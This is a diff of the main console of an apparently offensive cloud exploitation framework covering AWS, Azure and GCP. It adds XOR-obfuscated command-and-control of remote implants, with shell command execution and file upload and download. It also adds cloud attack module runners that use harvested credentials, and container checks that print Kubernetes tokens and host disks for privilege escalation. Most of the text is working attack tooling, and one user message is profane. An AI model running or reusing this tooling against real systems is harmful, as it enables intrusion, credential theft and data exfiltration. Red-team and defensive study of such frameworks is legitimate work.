@@ -1,15 +1,15 @@
 #!/usr/bin/python3
-
+import base64
 import socket, errno
 import boto3
 import botocore.session
 import sys
-import banner
+import core.banner.banner
 import os
 import copy
 import argparse
 from termcolor import colored
-import help
+from core.help import help
 import textwrap
 import json
 import botocore
@@ -30,16 +30,81 @@ import string
 from pydoc import pipepager
 import platform
 
-from enum_user_privs import enum_privs
-from getuid import getuid
+from core.enum_user_privs.enum_user_privs import enum_privs
+from core.enum_user_privs.getuid import getuid
+
+import core.run_module.run_aws_module
+import core.run_module.run_azure_module
+import core.run_module.run_gcp_module
 
 path = os.getcwd() + '\\less_binary'
+
+#def str_xor(s1, s2):
+#    return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
+
+def str_xor(a, key):
+    cipherAscii = ""
+    keyLength = len(key)
+    for i in range(0, len(a)):
+        j = i % keyLength
+        if not a[i] is str:
+            xor = ord(str(a[i])) ^ ord(key[j])
+        else:
+            xor = ord(a[i]) ^ ord(key[j])
+        cipherAscii = cipherAscii + chr(xor)
+    return cipherAscii
+
+def sendall(s, data):
+    splitLen = 1500
+    for lines in range(0, len(data), splitLen):
+        outputData = data[lines:lines + splitLen]
+        s.send(outputData)
+
+def recvall(s):
+    data = b''
+    #bufferlength = 65500
+    bufferlength = 1048576
+    while True:
+        a = s.recv(bufferlength)
+        #if len(a) == 0:
+        if a.decode().strip()[-4:] == 'done':
+            data += a
+            return data[:-4]
+        else:
+            data += a
+
 
 if platform.system() == 'Windows':
     pwsh = "powershell.exe -c '$env:Path = " + path + " + ;$env:Path'"
     os.popen(pwsh)
 
 init()
+
+regions = [
+    'af-south-1',
+    'ap-east-1',
+    'ap-northeast-1',
+    'ap-northeast-2',
+    'ap-northeast-3',
+    'ap-south-1',
+    'ap-southeast-1',
+    'ap-southeast-2',
+    'ca-central-1',
+    'eu-central-1',
+    'eu-north-1',
+    'eu-south-1',
+    'eu-west-1',
+    'eu-west-2',
+    'eu-west-3',
+    'me-south-1',
+    'sa-east-1',
+    'us-east-1',
+    'us-east-2',
+    'us-gov-east-1',
+    'us-gov-west-1',
+    'us-west-1',
+    'us-west-2'
+]
 
 '''
 particles = [
@@ -64,6 +129,8 @@ session = {}
 sess_test = {}
 sockets = {}
 
+enc_key = ""
+
 botocoresessions = []
 
 show = [
@@ -77,7 +144,8 @@ show = [
     'persistence',
     'privesc',
     'reconnaissance',
-    'stager'
+    'stager',
+    'misc'
 ]
 
 colors = [
@@ -184,23 +252,7 @@ def check_env_var(environ):
             )
         )
 
-def enter_credentials(service, access_key_id, secret_key, region):
-    return boto3.client(service, region_name=region, aws_access_key_id=access_key_id, aws_secret_access_key=secret_key)
 
-def enter_credentials_with_session_token(service, access_key_id, secret_key, region, session_token):
-    return boto3.client(service, region_name=region, aws_access_key_id=access_key_id, aws_secret_access_key=secret_key, aws_session_token=session_token)
-
-def enter_credentials_with_session_token_and_user_agent(service, access_key_id, secret_key, region, session_token, ua):
-    session_config = botocore.config.Config(user_agent=ua)
-    return boto3.client(service, region_name=region, aws_access_key_id=access_key_id, aws_secret_access_key=secret_key, aws_session_token=session_token, config=session_config)
-
-def enter_credentials_with_user_agent(service, access_key_id, secret_key, region, ua):
-    session_config = botocore.config.Config(user_agent=ua)
-    return boto3.client(service, config=session_config, region_name=region, aws_access_key_id=access_key_id, aws_secret_access_key=secret_key)
-
-def enter_session(session_name, region, service):
-    boto_session = boto3.session.Session(profile_name=session_name, region_name=region)
-    return boto_session.client(service)
 
 workspaces = []
 workspace = ""
@@ -211,6 +263,47 @@ terminal = colored("AWS", 'yellow')
 particles = {}
 
 module_char = ""
+
+def set_azure_credentials(command, comms):
+    profile_name = ""
+    if len(command.split(" ")) == 2:
+        profile_name = input("Profile Name: ")
+    elif len(command.split(" ")) > 2:
+        print("Profile Name: {}".format(command.split(" ")[2]))
+    profile_name = command.split(" ")[2]
+
+    type = input(colored(
+        """
+        Select the authentication method:
+        """
+    ))
+    client_id = input("Client ID: ")
+    secret_key = input("Secret Key ID: ")
+
+    sess_test['provider'] = 'AZURE'
+    sess_test['profile'] = str(profile_name)
+    sess_test['client_id'] = str(client_id)
+    sess_test['secret_key'] = str(secret_key)
+    sess_test['region'] = ""
+    yon = input("\nDo you also have a session token?[y/N] ")
+    if yon == 'y' or yon == 'Y':
+        sess_token = input("Session Token: ")
+    sess_test['session_token'] = sess_token
+
+    comms['use']['credentials'][profile_name] = None
+
+    if sess_test['profile'] == "" and sess_test['access_key_id'] == "" and sess_test['secret_key'] == "" and sess_test[
+        'region'] == "":
+        pass
+
+    else:
+        cred_prof = sess_test['profile']
+    all_sessions.append(copy.deepcopy(sess_test))
+
+    print(colored("[*] Credentials set. Use ", "green") + colored("'show credentials' ", "blue") + colored("to check them.",
+                                                                                                           "green"))
+    print(colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored(
+        "Use ", "green") + colored("'show current-creds' ", "blue") + colored("to check them.", "green"))
 
 def main(workspace, particle, terminal, p, s):
     print(
@@ -226,16 +319,18 @@ def main(workspace, particle, terminal, p, s):
         )
     else:
         print(
-            colored("[*] Imported sessions found on ~/.aws. Enter 'show available_sessions' to list the names, or 'show credentials' to get the credentials.", "green")
+            colored("[*] Imported sessions found on ~/.aws. Enter 'show credentials' to get the credentials.", "green")
         )
         if len(all_sessions) == 0:
             for botoprofile in botocoresessions:
                 botosession = botocore.session.Session(profile=botoprofile)
                 ass = {}
+                ass['provider'] = 'AWS'
                 ass['profile'] = botoprofile
                 ass['access_key_id'] = botosession.get_credentials().access_key
                 ass['secret_key'] = botosession.get_credentials().secret_key
                 ass['region'] = botosession.get_config_variable('region')
+
                 if not botosession.get_credentials().token == None:
                     ass['session_token'] = botosession.get_credentials().token
 
@@ -245,10 +340,11 @@ def main(workspace, particle, terminal, p, s):
             for botoprofile in botocoresessions:
                 for pr in all_sessions:
                     if pr['profile'] == botoprofile:
-                        yn = input("Profile '{}' exists. Do you want to overwrite? [y/N] ")
+                        yn = input("Profile '{}' exists. Do you want to overwrite? [y/N] ".format(pr['profile']))
                         if yn == 'y' or yn == 'Y':
                             botosession = botocore.session.Session(profile=botoprofile)
                             ass = {}
+                            ass['provider'] = 'AWS'
                             ass['profile'] = botoprofile
                             ass['access_key_id'] = botosession.get_credentials().access_key
                             ass['secret_key'] = botosession.get_credentials().secret_key
@@ -260,6 +356,7 @@ def main(workspace, particle, terminal, p, s):
                     else:
                         botosession = botocore.session.Session(profile=botoprofile)
                         ass = {}
+                        ass['provider'] = 'AWS'
                         ass['profile'] = botoprofile
                         ass['access_key_id'] = botosession.get_credentials().access_key
                         ass['secret_key'] = botosession.get_credentials().secret_key
@@ -274,7 +371,7 @@ def main(workspace, particle, terminal, p, s):
     if not module_char == "":
         #terminal = module_char
         m = (module_char.split("/")[1])[:-4]
-        print(m)
+
         imported_module = __import__(m)
 
     cred_prof = ""
@@ -320,7 +417,6 @@ def main(workspace, particle, terminal, p, s):
             "modules": None,
             "user-agent":None,
             "current-creds": None,
-            "available_sessions":None,
         },
         "search":None,
         "exit":None,
@@ -341,11 +437,38 @@ def main(workspace, particle, terminal, p, s):
             "credentials":None
         },
         "set": {
-            "credentials": None,
+            "aws-credentials": None,
+            "azure-credentials": None,
+            "gcp-credentials": None,
             "user-agent": {
                 "linux":None,
                 "windows":None,
                 "custom":None
+            },
+            "region": {
+                "af-south-1": None,
+                "ap-east-1": None,
+                "ap-northeast-1": None,
+                "ap-northeast-2": None,
+                "ap-northeast-3": None,
+                "ap-south-1": None,
+                "ap-southeast-1": None,
+                "ap-southeast-2": None,
+                "ca-central-1": None,
+                "eu-central-1": None,
+                "eu-north-1": None,
+                "eu-south-1": None,
+                "eu-west-1": None,
+                "eu-west-2": None,
+                "eu-west-3": None,
+                "me-south-1": None,
+                "sa-east-1": None,
+                "us-east-1": None,
+                "us-east-2": None,
+                "us-gov-east-1": None,
+                "us-gov-west-1": None,
+                "us-west-1": None,
+                "us-west-2": None
             }
         },
         "help":None,
@@ -364,6 +487,7 @@ def main(workspace, particle, terminal, p, s):
         },
         "run": None,
         "unset": {
+            "credentials":None,
             "user-agent":None,
             "particle":None
         },
@@ -380,8 +504,11 @@ def main(workspace, particle, terminal, p, s):
             }
         },
         "shell":{
-            "check_env":None,
-            "exit":None
+            "check_env": None,
+            "exit": None,
+            "upload": None,
+            "download": None,
+            "run_in_memory":None
         },
         "enum_user_privs":None,
         "rename":{
@@ -458,7 +585,7 @@ def main(workspace, particle, terminal, p, s):
                 comms['use']['particle'][key] = None
                 comms['kill']['particle'][key] = None
                 comms['rename']['particle'][x] = None
-            
+
             if os.path.exists('./module/listeners/__listeners/.particles'):
                 partdir = os.listdir('./module/listeners/__listeners/.particles')
                 for y in partdir:
@@ -496,6 +623,7 @@ def main(workspace, particle, terminal, p, s):
                         for key, value in sockets.items():
                             s = value['socket']
                             s.shutdown(2)
+
                             s.close()
 
                         print("All socket closed!")
@@ -563,6 +691,24 @@ def main(workspace, particle, terminal, p, s):
                 if workspace == "":
                     print(
                         colored("[*] Please choose a workspace first using 'use workspace <name>'.", "red"))
+                    ready = False
+
+                if ready:
+                    for sess in all_sessions:
+                        if sess['profile'] == cred_prof:
+                            enum_privs(sess, workspace)
+
+            elif command == 'enum_privesc':
+                ready = False
+                if cred_prof == "":
+                    print(colored("[*] Please choose a set of credentials first using 'use credentials <name>'.", "red"))
+                else:
+                    ready = True
+
+                if workspace == "":
+                    print(
+                        colored("[*] Please choose a workspace first using 'use workspace <name>'.", "red"))
+                    ready = False
 
                 if ready:
                     for sess in all_sessions:
@@ -578,7 +724,9 @@ def main(workspace, particle, terminal, p, s):
             elif len(command.split(" ")) > 2 and command.split(" ")[0] == 'kill':
                 if command.split(" ")[1] == 'socket':
                     for key,value in sockets.items():
-                        if int(command.split(" ")[2]) == key:
+                        if command.split(" ")[2] == key:
+                            os.remove(command.split(" ")[2])
+
                             if value['type'] == 'SOCK_STREAM':
                                 try:
                                     q = value['queue']
@@ -589,7 +737,9 @@ def main(workspace, particle, terminal, p, s):
                                         for c,v in particles.items():
                                             if value['module'] == v['module']:
                                                 conn = v['socket']
-                                                conn.send('exit'.encode())
+                                                exit_command = str_xor('exit ', enc_key)
+                                                exit_command += 'done'
+                                                conn.send(exit_command.encode())
                                                 conn.recv(1024)
                                                 closed.append(c)
 
@@ -742,6 +892,7 @@ def main(workspace, particle, terminal, p, s):
                             if name == command.split(" ")[2]:
                                 particle = name
                                 shell = par['socket']
+                                enc_key = par['ENCKEY']
                                 par_test = 0
                         if par_test == 1:
                             print(colored("[*] No session named: {}".format(command.split(" ")[1]), "red"))
@@ -779,10 +930,10 @@ def main(workspace, particle, terminal, p, s):
                             module_char = (command.split(" ")[2]).split("/")[1]
                             imported_module = __import__(module_char)
                             module_char = terminal
-                            comms['set'] = {
-                                "credentials":None
-                            }
-                            comms['unset'] = {}
+                            #comms['set'] = {
+                            #    "credentials":None
+                            #}
+                            #comms['unset'] = {}
                             for c,v in imported_module.variables.items():
                                 if c == 'SERVICE':
                                     pass
@@ -816,8 +967,8 @@ def main(workspace, particle, terminal, p, s):
                         else:
                             for sess in all_sessions:
                                 if sess['profile'] == command.split(" ")[2]:
-                                    command = input(colored("You are about to remove credential '{}'. Are you sure? [y/N] ".format(sess['profile']),"red"))
-                                    if command == "Y" or command == "y":
+                                    removeyn = input(colored("You are about to remove credential '{}'. Are you sure? [y/N] ".format(sess['profile']),"red"))
+                                    if removeyn == "Y" or removeyn == "y":
                                         all_sessions.remove(sess)
 
                     else:
@@ -871,100 +1022,45 @@ def main(workspace, particle, terminal, p, s):
                                 print(colored("[*] Option '{}' is not set!".format(key), "red"))
                                 count += 1
 
-                        for sess in all_sessions:
-                            if sess['profile'] == cred_prof:
-                                for key,value in sess.items():
-                                    if key == 'session_token':
-                                        continue
-
-                                    if value == "":
-                                        print (colored("[*] Credential '{}' not set yet!".format(key),"red"))
-                                        count = count + 1
-
                         if count == 0:
-                            try:
-                                service = imported_module.variables['SERVICE']['value']
-                                if imported_module.needs_creds:
-                                    for sess in all_sessions:
-                                        if sess['profile'] == cred_prof:
-                                            env_aws = {}
-                                            print("access")
-                                            if os.environ.get('AWS_ACCESS_KEY'):
-                                                env_aws['AWS_ACCESS_KEY'] = os.environ.get('AWS_ACCESS_KEY')
-                                                del os.environ['AWS_ACCESS_KEY']
-                                            os.environ['AWS_ACCESS_KEY'] = sess['access_key_id']
-                                            print("secret")
-                                            if os.environ.get('AWS_SECRET_KEY'):
-                                                env_aws['AWS_SECRET_KEY'] = os.environ.get('AWS_SECRET_KEY')
-                                                del os.environ['AWS_SECRET_KEY']
-                                            os.environ['AWS_SECRET_KEY'] = sess['secret_key']
+                            m_name = (module_char.split("/")[1]).split("_")[0]
+                            if m_name == 'aws':
+                                try:
+                                    core.run_module.run_aws_module.run_aws_module(imported_module, all_sessions, cred_prof, workspace, useragent)
 
-                                            if 'session_token' in sess and sess['session_token'] != "":
-                                                if os.environ.get('AWS_SESSION_TOKEN'):
-                                                    env_aws['AWS_SESSION_TOKEN'] = os.environ.get('AWS_SESSION_TOKEN')
-                                                    del os.environ['AWS_SESSION_TOKEN']
-                                                os.environ['AWS_SESSION_TOKEN'] = sess['session_token']
+                                except:
+                                    e = sys.exc_info()
+                                    print(colored("[*] {}".format(e), "red"))
+                                    print (colored("[*] Either a Connection Error or you don't have permission to use this module. Please check internet or credentials provided.'", "red"))
 
-                                            if os.environ.get('AWS_REGION'):
-                                                env_aws['AWS_REGION'] = os.environ.get('AWS_REGION')
-                                                del os.environ['AWS_REGION']
-                                            os.environ['AWS_REGION'] = sess['region']
+                            elif m_name == 'azure':
+                                try:
+                                    core.run_module.run_azure_module.run_azure_module(imported_module, all_sessions, cred_prof, workspace, useragent)
 
-                                            if not 'session_token' in sess:
-                                                if not useragent == "":
-                                                    profile_v = enter_credentials_with_user_agent(service,
-                                                                                                  sess['access_key_id'],
-                                                                                                  sess['secret_key'],
-                                                                                                  sess['region'],
-                                                                                                  useragent
-                                                                                                  )
-                                                    imported_module.exploit(profile_v, workspace)
+                                except:
+                                    e = sys.exc_info()
+                                    print(colored("[*] {}".format(e), "red"))
+                                    print (colored("[*] Either a Connection Error or you don't have permission to use this module. Please check internet or credentials provided.'", "red"))
 
-                                                else:
-                                                    profile_v = enter_credentials(service,
-                                                                                  sess['access_key_id'],
-                                                                                  sess['secret_key'],
-                                                                                  sess['region']
-                                                                                  )
-                                                    imported_module.exploit(profile_v, workspace)
-                                            elif 'session_token' in sess and sess['session_token'] != "":
-                                                if not useragent == "":
-                                                    profile_v = enter_credentials_with_session_token(service,
-                                                                                            sess['access_key_id'],
-                                                                                            sess['secret_key'],
-                                                                                            sess['region'],
-                                                                                            sess['session_token']
-                                                                                            )
-                                                    imported_module.exploit(profile_v, workspace)
-                                                else:
-                                                    profile_v = enter_credentials_with_session_token_and_user_agent(service,
-                                                                                                  sess['access_key_id'],
-                                                                                                  sess['secret_key'],
-                                                                                                  sess['region'],
-                                                                                                  sess['session_token'],
-                                                                                                  useragent)
-                                                    imported_module.exploit(profile_v, workspace)
-                                            else:
-                                                print(colored("[*] Check if the session key is empty.","yellow"))
-                                            del os.environ['AWS_ACCESS_KEY']
-                                            del os.environ['AWS_SECRET_KEY']
-                                            del os.environ['AWS_REGION']
-                                            if os.environ.get('AWS_SESSION_TOKEN'):
-                                                del os.environ['AWS_SESSION_TOKEN']
+                            elif m_name == 'azuread':
+                                try:
+                                    core.run_module.run_azure_module.run_azure_module(imported_module, all_sessions, cred_prof, workspace, useragent)
 
-                                            if env_aws:
-                                                os.environ['AWS_ACCESS_KEY'] = env_aws['AWS_ACCESS_KEY']
-                                                os.environ['AWS_SECRET_KEY'] = env_aws['AWS_SECRET_KEY']
-                                                os.environ['AWS_REGION'] = env_aws['AWS_REGION']
-                                                os.environ['AWS_SESSION_TOKEN'] = env_aws['AWS_SESSION_TOKEN']
-                                else:
-                                    imported_module.exploit(workspace)
+                                except:
+                                    e = sys.exc_info()
+                                    print(colored("[*] {}".format(e), "red"))
+                                    print (colored("[*] Either a Connection Error or you don't have permission to use this module. Please check internet or credentials provided.'", "red"))
 
-                            except:
-                                e = sys.exc_info()
-                                print(colored("[*] {}".format(e), "red"))
-                                print (colored("[*] Either a Connection Error or you don't have permission to use this module. Please check internet or credentials provided.'", "red"))
+                            elif m_name == 'gcp':
+                                try:
+                                    core.run_module.run_gcp_module.run_gcp_module(imported_module, all_sessions, cred_prof, workspace, useragent)
 
+                                except:
+                                    e = sys.exc_info()
+                                    print(colored("[*] {}".format(e), "red"))
+                                    print (colored("[*] Either a Connection Error or you don't have permission to use this module. Please check internet or credentials provided.'", "red"))
+                            else:
+                                imported_module.exploit(workspace)
                     else:
                         print(colored(
                             "[*] Create a workstation first using 'create workspace <workstation name>'.",
@@ -1006,12 +1102,78 @@ def main(workspace, particle, terminal, p, s):
                                 print(colored("Usage: shell meta-data <option>",
                                               "red"))
 
+                        elif command.split(" ")[1] == "upload":
+                            if len(command.split(" ")) < 3:
+                                print(
+                                    colored("[*] Usage: shell upload <filepath>", "red")
+                                )
+                            else:
+                                filepath = command.split(" ")[2]
+                                thefile = open(filepath, 'rb')
+                                filedata = thefile.read()
+                                filedatab64 = base64.b32encode(filedata).decode()
+                                upload_json = {
+                                    "filepath":filepath.split("/")[-1],
+                                    "filedata":filedatab64
+                                }
+                                send_data = "upload {}".format(json.dumps(upload_json))
+
+                                send_xor_data = str_xor(send_data, enc_key)
+                                send_xor_data += 'done'
+                                shell.send(send_xor_data.encode())
+                                print(
+                                    colored("[*] File '{}' uploaded .".format(filepath.split("/")[-1]), "green")
+                                )
+
+                        elif command.split(" ")[1] == "download":
+                            if len(command.split(" ")) < 3:
+                                print(
+                                    colored("[*] Usage: shell download <filepath>", "red")
+                                )
+                            else:
+                                filepath = command.split(" ")[2]
+                                download_json = {
+                                    "filepath":filepath
+                                }
+                                print("download {}done".format(json.dumps(download_json)))
+                                download_xor = str_xor("download {}done".format(json.dumps(download_json)), enc_key)
+                                shell.send(download_xor.encode())
+                                b64_data = recvall(shell).decode()
+                                b64_xor = str_xor(b64_data, enc_key)
+                                binary_data = base64.b32decode(b64_xor.encode())
+                                bin_file = open(filepath.split("/")[-1], 'wb')
+                                bin_file.write(binary_data)
+                                bin_file.close()
+                                print(
+                                    colored("[*] File '{}' downloaded .".format(filepath.split("/")[-1]), "green")
+                                )
+
                         elif command.split(" ")[1] == 'check_env':
+
                             print(
                                 colored("[*] It might take 5-6 seconds to work. Please wait! (or don't. Fuck you in each case.)", "yellow")
                             )
-                            shell.send("check_env".encode())
-                            check_env_dict = json.loads(shell.recv(20480).decode())
+                            check_env_command = str_xor("check_env ", enc_key)
+                            check_env_command += 'done'
+                            shell.send(check_env_command.encode())
+
+                            #fragments = []
+                            #while True:
+                            #    chunk = shell.recv(65534)
+                            #    if not chunk:
+                            #        break
+                            #    fragments.append(chunk)
+                            #check_env_response_bytes = b''.join(fragments)
+
+                            check_env_response = str_xor(recvall(shell).decode(), enc_key)
+
+                            #while check_env_response[-5:] == 'still':
+                            #    check_env_command = str_xor(" ", enc_key)
+                            #    shell.send(check_env_command.encode())
+                            #    check_env_response += str_xor(shell.recv(65534).decode(), enc_key)
+                            #print(check_env_response)
+
+                            check_env_dict = json.loads(check_env_response)
 
                             now = datetime.now()
                             dt_string = now.strftime("%d_%m_%Y_%H_%M_%S")
@@ -1020,6 +1182,7 @@ def main(workspace, particle, terminal, p, s):
                             with open("./workspaces/{}/{}/{}".format(workspace, particle, check_env_file), "w") as particle_file:
                                 json.dump(check_env_dict, particle_file, indent=4, default=str)
                             particle_file.close()
+                            print(check_env_dict)
 
                             print(
                                 "{}".format(
@@ -1086,10 +1249,36 @@ def main(workspace, particle, terminal, p, s):
 
                             if check_env_dict['DOCKSOCK']:
                                 print(
-                                    "{}{}".format(
                                         colored("[*] Docker Socket exists. If you are on a container, you can use it to Privilege Escalate.", "green")
-                                    )
                                 )
+
+                            if check_env_dict['PRIVILEGED']:
+                                print(
+                                        colored(
+                                            "[*] Container appears to be run on Privileged Mode. Listing the host disks:",
+                                            "green")
+                                )
+                                print(
+                                        colored(
+                                            "---------------------------------------------",
+                                            "yellow")
+                                )
+                                if check_env_dict['DISKS']:
+                                    for disk in check_env_dict['DISKS']:
+                                        print(
+                                                colored(
+                                                    "\t{}".format(disk),
+                                                    "yellow")
+                                        )
+
+                            if 'KUBETOKEN' in check_env_dict:
+                                print(
+
+                                        colored(
+                                            "[*] Kube token exists. Value: {}".format(check_env_dict['KUBETOKEN']),
+                                            "green")
+                                    )
+
 
                             print(
                                 colored("------------------------------------------------------------------------------","yellow")
@@ -1254,11 +1443,16 @@ def main(workspace, particle, terminal, p, s):
                                 cmd = ""
                                 for c in (command.split(" ")[1:]):
                                     cmd += c + " "
+                                cmd += " "
 
-                                shell.send(cmd.encode())
-                                response = shell.recv(20480).decode()
+                                cmd_command = str_xor(cmd, enc_key)
+                                cmd_command += 'done'
+                                shell.send(cmd_command.encode())
+
+                                response = str_xor(recvall(shell).decode(), enc_key)
                                 if response == "":
                                     print()
+
                                 print(response)
 
                             if "_udp_" in particles[particle]['module']:
@@ -1309,7 +1503,7 @@ def main(workspace, particle, terminal, p, s):
                     print(colored("\nAuthor:", "yellow", attrs=["bold"]))
                     print(colored("-----------------------------", "yellow", attrs=["bold"]))
                     for x, y in imported_module.author.items():
-                        print("\t{}:\t{}".format(colored(x, "red"), colored(y, "blue")))
+                        print("\t{}: {}".format(colored(x, "red"), colored(y, "blue")))
 
                     print()
                     print("{}: {}".format(colored("Needs Credentials", "yellow", attrs=["bold"]),
@@ -1349,12 +1543,12 @@ def main(workspace, particle, terminal, p, s):
 
                     access_key_id = input("Access Key ID: ")
                     secret_key = input("Secret Key ID: ")
-                    region = input("Region: ")
+                    #region = input("Region: ")
 
                     sess_test['profile'] = str(profile_name)
                     sess_test['access_key_id'] = str(access_key_id)
                     sess_test['secret_key'] = str(secret_key)
-                    sess_test['region'] = str(region)
+                    sess_test['region'] = str("")
                     yon = input("\nDo you also have a session token?[y/N] ")
                     if yon == 'y' or yon == 'Y':
                         sess_token = input("Session Token: ")
@@ -1370,13 +1564,21 @@ def main(workspace, particle, terminal, p, s):
                         all_sessions.append(copy.deepcopy(sess_test))
 
                     print (colored("[*] Credentials set. Use ","green") + colored("'show credentials' ","blue") + colored("to check them.","green"))
-                    print(colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored("Use ","green") + colored("'show current-creds' ","blue") + colored("to check them.","green"))
+                    print (colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored("Use ","green") + colored("'show current-creds' ","blue") + colored("to check them.","green"))
 
             elif command == 'set':
                 print(colored("Option 'set' is used with another option. Use help for more.","red"))
 
             elif command.split(" ")[0] == 'set':
-                if command.split(" ")[1] == 'credentials':
+                if command.split(" ")[1] == 'region':
+                    if len(command.split(" ")) < 3:
+                        print(colored("[*] Usage: 'set region <region-name>'", "red"))
+                    else:
+                        for sess in all_sessions:
+                            if sess['profile'] == cred_prof:
+                                sess['region'] = command.split(" ")[2]
+
+                elif command.split(" ")[1] == 'aws-credentials':
                     profile_name = ""
                     if len(command.split(" ")) == 2:
                         profile_name = input("Profile Name: ")
@@ -1386,12 +1588,12 @@ def main(workspace, particle, terminal, p, s):
 
                     access_key_id = input("Access Key ID: ")
                     secret_key = input("Secret Key ID: ")
-                    region = input("Region: ")
 
+                    sess_test['provider'] = 'AWS'
                     sess_test['profile'] = str(profile_name)
                     sess_test['access_key_id'] = str(access_key_id)
                     sess_test['secret_key'] = str(secret_key)
-                    sess_test['region'] = str(region)
+                    sess_test['region'] = ""
                     yon = input("\nDo you also have a session token?[y/N] ")
                     if yon == 'y' or yon == 'Y':
                         sess_token = input("Session Token: ")
@@ -1408,6 +1610,9 @@ def main(workspace, particle, terminal, p, s):
 
                     print (colored("[*] Credentials set. Use ","green") + colored("'show credentials' ","blue") + colored("to check them.","green"))
                     print(colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored("Use ","green") + colored("'show current-creds' ","blue") + colored("to check them.","green"))
+
+                elif command.split(" ")[1] == 'azure-credentials':
+                    set_azure_credentials(command, comms)
 
                 elif command.split(" ")[1] == 'user-agent':
                     if len(command.split(' ')) < 3 or len(command.split('"')) > 3:
@@ -1458,6 +1663,12 @@ def main(workspace, particle, terminal, p, s):
                     shell = None
                     particle = ""
 
+                elif (command.split(" ")[1]).lower() == 'credentials':
+                    print(colored(
+                        "[*] Credentials unset. Now you have no current-credentials choosen.", "green"
+                    ))
+                    cred_prof = ""
+
                 else:
                     if module_char == "":
                         print(colored("[*] Choose a module first.","red"))
@@ -1492,6 +1703,8 @@ def main(workspace, particle, terminal, p, s):
                                       "yellow"))
                         for key,value in sockets.items():
                             if value['socket'] == None:
+                                continue
+                            elif key == 'ENKEY':
                                 continue
                             else:
                                 if value['type'] == "SOCK_STREAM":
@@ -1542,6 +1755,11 @@ def main(workspace, particle, terminal, p, s):
                         print("{}: {}".format(colored("[*] User Agent is", "green"), colored(useragent, "yellow")))
 
                 elif command.split(" ")[1] == 'current-creds':
+                    if cred_prof == "":
+                        print(colored(
+                            "[*] You have no credentials choosen. Either set some or use some.", "yellow"
+                        ))
+
                     for sess in all_sessions:
                         if sess['profile'] == cred_prof:
                             print(json.dumps(sess, indent=4, default=str))
@@ -1643,7 +1861,9 @@ def main(workspace, particle, terminal, p, s):
                     if len(command.split(" ")) < 3:
                         print(colored("[*] Usage: import credentials <cred name>","red"))
                     else:
-                        if "/" in command.split(" ")[2] or "\\" in command.split(" ")[2]:
+                        if command.split(" ")[2] == "":
+                            print(colored("[*] Usage: import credentials <cred name>", "red"))
+                        elif "/" in command.split(" ")[2] or "\\" in command.split(" ")[2]:
                             print(colored("[*] Just enter the credential file name, not the whole path. That being said, no \\ or / should be on the file name.","red"))
                         else:
                             with open("./credentials/{}".format(command.split(" ")[2]), 'r') as outfile:
@@ -1720,14 +1940,16 @@ def main(workspace, particle, terminal, p, s):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument("-b", action='store_true', help="Do not print banner")
+    parser.add_argument("-g", action='store_true', help="Start the GUI Interface")
     args = parser.parse_args()
 
     if args.b:
         print(colored("-------------------------------------------------------------", "green"))
-        banner.module_count_without_banner()
+        core.banner.banner.module_count_without_banner()
         print(colored("-------------------------------------------------------------\n", "green"))
+
     else:
-        banner.banner()
+        core.banner.banner.banner()
 
     p = {}
     main(workspace, particle, terminal, p, sockets)
